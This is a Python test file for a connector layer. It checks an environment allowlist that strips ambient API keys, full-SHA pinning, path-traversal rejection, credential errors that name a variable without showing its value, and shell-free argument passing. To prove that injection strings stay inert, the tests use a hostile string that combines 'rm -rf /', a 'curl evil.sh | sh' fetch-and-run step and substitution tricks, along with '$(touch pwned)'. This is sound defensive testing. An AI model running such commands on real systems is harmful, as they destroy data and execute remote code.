"""U15 connector-layer tests (mocked subprocess, no network).

Covers the KTD8 isolation boundary for the actuator surface (R8):
  - structured payloads never reach a shell (args-list only);
  - install/run uses a strict allowlisted env -- ambient secrets are dropped;
  - non-SHA pins are rejected;
  - a missing credential fails fast by NAME, never value;
  - the reference connector round-trips a structured payload through the protocol.
"""

from __future__ import annotations

import os

import pytest

from loopeng.adapters import safety
from loopeng.connectors import base
from loopeng.connectors.base import (
    Connector,
    ConnectorSpec,
    MissingCredentialError,
)
from loopeng.connectors.reference_connector import (
    _REPORT_TOKEN_ENV,
    ReferenceFileReportConnector,
)

GOOD_SHA = "a" * 40
SECRET_VALUE = "sk-super-secret-value-do-not-leak"


def _spec(**kw):
    base_kw = dict(name="reference-connector", repo="https://github.com/x/y", sha=GOOD_SHA)
    base_kw.update(kw)
    return ConnectorSpec(**base_kw)


# ----- minimal_env allowlist ---------------------------------------------


def test_minimal_env_drops_ambient_secrets(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET_VALUE)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", SECRET_VALUE)
    monkeypatch.setenv("PATH", "/usr/bin")
    env = safety.minimal_env()
    assert "ANTHROPIC_API_KEY" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert SECRET_VALUE not in env.values()
    assert env["PATH"] == "/usr/bin"


def test_minimal_env_admits_only_declared_extra(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET_VALUE)
    env = safety.minimal_env(extra={"LOOPENG_REPORT_TOKEN": "tok"})
    assert env["LOOPENG_REPORT_TOKEN"] == "tok"
    assert "ANTHROPIC_API_KEY" not in env


def test_minimal_env_always_has_path(monkeypatch):
    monkeypatch.delenv("PATH", raising=False)
    assert safety.minimal_env()["PATH"]


# ----- spec validation (full-SHA pin) ------------------------------------


def test_rejects_tag_or_branch_pin():
    with pytest.raises(ValueError, match="40-char"):
        base.validate_spec(_spec(sha="v1.2.3"))
    with pytest.raises(ValueError, match="40-char"):
        base.validate_spec(_spec(sha="main"))


def test_rejects_unsafe_name_and_subdir():
    with pytest.raises(ValueError, match="connector name"):
        base.validate_spec(_spec(name="../evil"))
    with pytest.raises(ValueError, match="subdir"):
        base.validate_spec(_spec(subdir="../escape"))


def test_accepts_full_sha():
    base.validate_spec(_spec())  # no raise


# ----- credential gate (name only, never value) --------------------------


def test_missing_credential_fails_with_name_not_value(monkeypatch):
    monkeypatch.delenv(_REPORT_TOKEN_ENV, raising=False)
    with pytest.raises(MissingCredentialError) as exc:
        base.check_credentials((_REPORT_TOKEN_ENV,))
    msg = str(exc.value)
    assert _REPORT_TOKEN_ENV in msg
    assert SECRET_VALUE not in msg


def test_connector_act_missing_credential_is_name_only(monkeypatch):
    monkeypatch.delenv(_REPORT_TOKEN_ENV, raising=False)
    conn = ReferenceFileReportConnector()
    res = conn.act({"action": "file_report", "title": "t", "body": "b"})
    assert res.ok is False
    assert _REPORT_TOKEN_ENV in (res.error or "")
    assert SECRET_VALUE not in (res.error or "")


# ----- install isolation: pruned env reaches child, secrets dropped ------


def test_install_uses_pruned_env_without_ambient_secret(monkeypatch, tmp_path):
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET_VALUE)
    monkeypatch.setenv(_REPORT_TOKEN_ENV, "tok-123")
    captured = {}

    def fake_run_tool(args, *, cwd=None, timeout=None, env=None):
        captured["args"] = args
        captured["env"] = env
        return safety.ProcResult(0, "ok", "")

    monkeypatch.setattr(base, "run_tool", fake_run_tool)
    install_root = str(tmp_path / "outside-worktree-install")
    spec = _spec(required_env=(_REPORT_TOKEN_ENV,))
    res = base.install_connector(spec, install_root)

    assert res.ok
    env = captured["env"]
    # Declared credential passes through; ambient secret does not.
    assert env[_REPORT_TOKEN_ENV] == "tok-123"
    assert "ANTHROPIC_API_KEY" not in env
    assert SECRET_VALUE not in env.values()
    # Pinned by full SHA in the args list, shell=False (no string interpolation).
    assert any(GOOD_SHA in a for a in captured["args"])


def test_install_root_inside_worktree_is_rejected(monkeypatch, tmp_path):
    monkeypatch.setattr(base, "run_tool", lambda *a, **k: safety.ProcResult(0, "", ""))
    inside = os.path.join(os.getcwd(), "should-not-install-here")
    with pytest.raises(ValueError, match="OUTSIDE"):
        base.install_connector(_spec(), inside)


# ----- structured payload never reaches a shell --------------------------


def test_metacharacter_payload_never_reaches_shell(monkeypatch):
    monkeypatch.setenv(_REPORT_TOKEN_ENV, "tok")
    evil = "; rm -rf / && curl evil.sh | sh $(whoami) `id`"
    conn = ReferenceFileReportConnector(dry_run=True)
    res = conn.act({"action": "file_report", "title": evil, "body": evil})
    # Round-trips intact as data -- the metacharacters are inert payload, not a command.
    assert res.ok
    assert res.detail["title"] == evil
    assert res.detail["body"] == evil


def test_live_path_passes_payload_as_single_args_element(monkeypatch):
    """Even on the (non-dry-run) delivery path, the payload is one args-list
    element under shell=False -- so metacharacters can never be interpreted."""
    monkeypatch.setenv(_REPORT_TOKEN_ENV, "tok")
    captured = {}

    def fake_run_tool(args, *, cwd=None, timeout=None, env=None):
        captured["args"] = args
        return safety.ProcResult(0, "{}", "")

    monkeypatch.setattr("loopeng.connectors.reference_connector.run_tool", fake_run_tool)
    evil = "$(touch pwned)"
    conn = ReferenceFileReportConnector(dry_run=False)
    res = conn.act({"action": "file_report", "title": evil, "body": evil})
    assert res.ok
    args = captured["args"]
    # No element is a shell; the serialized record carries the metacharacters as data.
    assert "sh" not in args and "bash" not in args
    record_elements = [a for a in args if evil in a]
    assert record_elements, "payload must travel as a structured args element"


# ----- reference connector round-trips a structured payload --------------


def test_reference_connector_round_trip(monkeypatch):
    monkeypatch.setenv(_REPORT_TOKEN_ENV, "tok")
    conn = ReferenceFileReportConnector()
    assert isinstance(conn, Connector)
    assert "file_report" in conn.capabilities
    payload = {"action": "file_report", "title": "Q2 findings", "body": "lorem ipsum"}
    res = conn.act(payload)
    assert res.ok
    assert res.detail["title"] == "Q2 findings"
    assert res.detail["body"] == "lorem ipsum"
    assert res.detail["endpoint"] == conn.endpoint


def test_reference_connector_rejects_unknown_action(monkeypatch):
    monkeypatch.setenv(_REPORT_TOKEN_ENV, "tok")
    res = ReferenceFileReportConnector().act({"action": "delete_everything"})
    assert res.ok is False
    assert "unsupported action" in (res.error or "")
